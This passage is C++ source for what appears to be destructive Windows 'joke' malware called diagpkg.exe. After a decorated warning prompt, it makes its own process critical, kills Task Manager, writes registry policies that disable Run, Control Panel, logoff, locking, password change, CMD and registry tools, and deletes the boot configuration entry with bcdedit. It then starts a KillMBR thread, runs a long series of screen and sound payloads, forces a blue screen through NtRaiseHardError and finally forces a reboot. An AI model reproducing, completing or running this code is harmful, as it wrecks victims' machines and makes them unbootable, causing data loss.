		if (MessageBoxW(NULL, L"ꋖ𝕙[̲̅i]『s』 𝒾𝔰 𝓽𝓱Ꮛ 𝓁ꁲ𝔰【t】 『w』₳尺🅽[̲̅i]Ꮑ𝕘!!!\r\n\ 𝔻ꂦ 🅨ㄖ𝕦 𝖜𝕒𝓃🅣 [̲̅t]ⓞ 𝕣𝓮ꁲ𝔩Ꮭ🆈 𝓇ꐇ𝔫? 🅰ꄞ𝕥𝕖Ɽ『 』🅡Ꮼ【n】ꋊ𝕚𝓃ꁅ, 【y】𝓸𝓾𝓻 【c】𝕠🅼𝓹ㄩ🅣[̲̅e]ꌅ『 』𝖒𝔞𝓎 🅽🅾𝓽 ₩『o』🅡ꀗ 『n』Ꭷ尺Ꮇ𝓪『l』𝓵『y』! Ł𝔣『 』𝔂ØᏬ Ɽ『u』ⓝ 𝓽ᏂᏋ 卄『a』𝕣『m』🅵🅤Ꮭ 🅔ᗪⓘ『t』[̲̅i]Ø[̲̅n]『 』『o』𝔣【 】𝓉𝕙𝓲🆂 𝓅Ꮢ『o』₲Ɽ卂『m』 ⓞ🅽 𝕠[̲̅t]𝔥𝑒🅡 🅿𝕖[̲̅o]𝓅ⓛ𝕖'𝕤 Ø🅡 ꉣ𝕦🅱🅛🅘𝓬 𝓬Ꭷ爪ꉣꐇᏖꈼ🅡𝓈, 𝔂『o』𝕦【 】𝓌𝔦𝕝꒒ 🅱Ɇ 𝖗『e』𝓈[̲̅p]𝕠ⓝ『s』🅘🅱[̲̅l]𝕖 ꄞⓞ🅡 ꁲ𝕟ⓨ 【l】Ø[̲̅s]𝔰Ꮛ₴ 𝔞『n』Ꮄ Ⱡ🅴[̲̅g]【a】Ꮭ 𝓁ł𝕒🅱『i』꒒ꂑ【t】[̲̅i]『e』₴ 【c】🅰[̲̅u]🅢乇𝕕 𝒷ⓨ 『r』『u』『n』🅝𝒾𝔫ⓖ 🆃🅷[̲̅i]Ꮥ[̲̅ ]𝔭Ɽ𝓸𝓰𝔯Ꮧ『m』! [̲̅T]ⓗɆ【 】ꅏⓡ𝖎𝕥𝓮尺 Ø𝕗 ₮𝔥𝕚𝓼[̲̅ ]ፈØ爪𝖕𝖚[̲̅t]ⓔ𝕣[̲̅ ]𝓿𝖎Ꮢꐇ𝓼(LambdaTechnology)『 』𝔦『s』𝓷'🅣[̲̅ ]ⓡⓔ『s』𝔭ㄖ₦₴【i】ꋰ🅻Ꮛ！！！", L"diagpkg.exe--LAST WARNING", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			system("taskkill /f /im taskmgr.exe");
			system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
			system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
			system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
			system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
			system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
			system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
			system("bcdedit /delete {current}");
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 1);
			CreateThread(0, 0, KillMBR, 0, 0, 0);
			Sleep(5000);
			HANDLE thread0 = CreateThread(0, 0, MouseColours, 0, 0, 0);
			Sleep(500);
			HANDLE thread1_num1 = CreateThread(0, 0, Payload1_num1, 0, 0, 0);
			HANDLE thread1_num2 = CreateThread(0, 0, Payload1_num2, 0, 0, 0);
			bytebeat1();
			TerminateThread(thread1_num1, 0);
			CloseHandle(thread1_num1);
			TerminateThread(thread1_num2, 0);
			CloseHandle(thread1_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread2_num1 = CreateThread(0, 0, Payload2_num1, 0, 0, 0);
			HANDLE thread2_num2 = CreateThread(0, 0, Payload2_num2, 0, 0, 0);
			bytebeat2();
			TerminateThread(thread2_num1, 0);
			CloseHandle(thread2_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread3_num1 = CreateThread(0, 0, Payload3_num1, 0, 0, 0);
			HANDLE thread3_num2 = CreateThread(0, 0, Payload3_num2, 0, 0, 0);
			bytebeat3();
			TerminateThread(thread3_num1, 0);
			CloseHandle(thread3_num1);
			TerminateThread(thread3_num2, 0);
			CloseHandle(thread3_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread4_num1 = CreateThread(0, 0, Payload4_num1, 0, 0, 0);
			HANDLE thread4_num2 = CreateThread(0, 0, Payload4_num2, 0, 0, 0);
			bytebeat4();
			TerminateThread(thread4_num1, 0);
			CloseHandle(thread4_num1);
			TerminateThread(thread4_num2, 0);
			CloseHandle(thread4_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread5 = CreateThread(0, 0, Payload5_num1, 0, 0, 0);
			bytebeat5();
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread6 = CreateThread(0, 0, Payload6_num1, 0, 0, 0);
			bytebeat6();
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread7_num1 = CreateThread(0, 0, Payload7_num1, 0, 0, 0);
			HANDLE thread7_num2 = CreateThread(0, 0, Payload7_num2, 0, 0, 0);
			bytebeat7();
			TerminateThread(thread7_num1, 0);
			CloseHandle(thread7_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread8 = CreateThread(0, 0, Payload8_num1, 0, 0, 0);
			bytebeat8();
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread9_num1 = CreateThread(0, 0, Payload9_num1, 0, 0, 0);
			HANDLE thread9_num2 = CreateThread(0, 0, Payload9_num2, 0, 0, 0);
			bytebeat9();
			TerminateThread(thread9_num1, 0);
			CloseHandle(thread9_num1);
			TerminateThread(thread9_num2, 0);
			CloseHandle(thread9_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread10 = CreateThread(0, 0, Payload10_num1, 0, 0, 0);
			bytebeat10();
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread11 = CreateThread(0, 0, Payload11_num1, 0, 0, 0);
			bytebeat11();
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread12_num1 = CreateThread(0, 0, Payload12_num1, 0, 0, 0);
			HANDLE thread12_num2 = CreateThread(0, 0, Payload12_num2, 0, 0, 0);
			CreateThread(0, 0, FileOpener, 0, 0, 0);
			bytebeat12();
			TerminateThread(thread12_num1, 0);
			CloseHandle(thread12_num1);
			TerminateThread(thread12_num2, 0);
			CloseHandle(thread12_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread13 = CreateThread(0, 0, Payload13_num1, 0, 0, 0);
			bytebeat13();
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread14 = CreateThread(0, 0, Payload14_num1, 0, 0, 0);
			bytebeat14();
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread15_num1 = CreateThread(0, 0, Payload15_num1, 0, 0, 0);
			HANDLE thread15_num2 = CreateThread(0, 0, Payload15_num2, 0, 0, 0);
			HANDLE thread15_num3 = CreateThread(0, 0, Payload15_num3, 0, 0, 0);
			bytebeat15();
			TerminateThread(thread15_num1, 0);
			CloseHandle(thread15_num1);
			TerminateThread(thread15_num2, 0);
			CloseHandle(thread15_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread16 = CreateThread(0, 0, Payload16_num1, 0, 0, 0);
			bytebeat16();
			TerminateThread(thread16, 0);
			CloseHandle(thread16);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread17_num1 = CreateThread(0, 0, Payload17_num1, 0, 0, 0);
			HANDLE thread17_num2 = CreateThread(0, 0, Payload17_num2, 0, 0, 0);
			bytebeat17();
			TerminateThread(thread17_num1, 0);
			CloseHandle(thread17_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread18_num1 = CreateThread(0, 0, Payload18_num1, 0, 0, 0);
			HANDLE thread18_num2 = CreateThread(0, 0, Payload18_num2, 0, 0, 0);
			bytebeat18();
			TerminateThread(thread18_num1, 0);
			CloseHandle(thread18_num1);
			TerminateThread(thread18_num2, 0);
			CloseHandle(thread18_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread19 = CreateThread(0, 0, Payload19_num1, 0, 0, 0);
			bytebeat19();
			TerminateThread(thread19, 0);
			CloseHandle(thread19);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread20 = CreateThread(0, 0, Payload20_num1, 0, 0, 0);
			bytebeat20();
			TerminateThread(thread20, 0);
			CloseHandle(thread20);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread21 = CreateThread(0, 0, Payload21_num1, 0, 0, 0);
			bytebeat21();
			TerminateThread(thread21, 0);
			CloseHandle(thread21);
			InvalidateRect(0, 0, 0);
			refreshscr();
			TerminateThread(thread0, 0);
			CloseHandle(thread0);
			TerminateThread(thread2_num2, 0);
			CloseHandle(thread2_num2);
			TerminateThread(thread7_num2, 0);
			CloseHandle(thread7_num2);
			TerminateThread(thread15_num3, 0);
			CloseHandle(thread15_num3);
			TerminateThread(thread17_num2, 0);
			CloseHandle(thread17_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC0005033, 0, 0, 0, 6, &response);
			// If the computer is still running, do it the normal way
			HANDLE token;
			TOKEN_PRIVILEGES privileges;
			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
			// The actual restart
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			Sleep(-1);
		}
	}
	return 0;
}
